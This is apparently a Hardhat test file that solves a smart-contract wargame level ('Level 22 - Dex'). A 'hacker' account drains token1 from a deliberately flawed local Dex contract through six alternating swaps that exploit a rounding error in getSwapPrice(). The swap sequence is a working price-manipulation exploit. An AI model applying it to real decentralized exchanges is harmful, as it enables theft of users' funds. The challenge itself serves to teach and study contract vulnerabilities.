import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 22 - Dex contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const DexContract = await ethers.getContractFactory("Dex");
        const TokenContract = await ethers.getContractFactory("SwappableToken");

        const dex = await DexContract.deploy();
        const token1 = await TokenContract.deploy(await dex.getAddress(), "Token 1", "TKN1", BigInt(110));
        const token2 = await TokenContract.deploy(await dex.getAddress(), "Token 2", "TKN2", BigInt(110));

        await dex.connect(owner).setTokens(await token1.getAddress(), await token2.getAddress());
        await dex.connect(owner).approve(await dex.getAddress(), BigInt(100));
                
        await dex.connect(owner).addLiquidity(await token1.getAddress(), BigInt(100));
        await dex.connect(owner).addLiquidity(await token2.getAddress(), BigInt(100));

        await token1.connect(owner).transfer(hacker.address, BigInt(10));
        await token2.connect(owner).transfer(hacker.address, BigInt(10));

        return {owner, hacker, dex, token1, token2};
    };
    
    describe("When hacking", () => {
        it("Hacker should deplete the DEX by iteratively swapping from token1 to token2 back and forth", async() => {
            const {owner, hacker, dex, token1, token2} = await loadFixture(setUp);
            
            expect(await token1.balanceOf(await dex.getAddress())).to.equal(BigInt(100));
            expect(await token2.balanceOf(await dex.getAddress())).to.equal(BigInt(100));

            await dex.connect(hacker).approve(await dex.getAddress(), BigInt(1000));

            // Due to the rounding error on the getSwapPrice() method, we can iteratively swap token1 for token2 back and forth.
            // This way, we'll reach a point were we'll deplete at least one of the tokens.
            await dex.connect(hacker).swap(await token1.getAddress(), await token2.getAddress(), BigInt(10));
            await dex.connect(hacker).swap(await token2.getAddress(), await token1.getAddress(), BigInt(20));
            await dex.connect(hacker).swap(await token1.getAddress(), await token2.getAddress(), BigInt(24));
            await dex.connect(hacker).swap(await token2.getAddress(), await token1.getAddress(), BigInt(30));
            await dex.connect(hacker).swap(await token1.getAddress(), await token2.getAddress(), BigInt(41));
            await dex.connect(hacker).swap(await token2.getAddress(), await token1.getAddress(), BigInt(45));

            // Given that out of the iterations we know that token1 will be the first to drain out from the dex, we check:
            expect(await token1.balanceOf(await dex.getAddress())).to.equal(BigInt(0));
        });
    });
});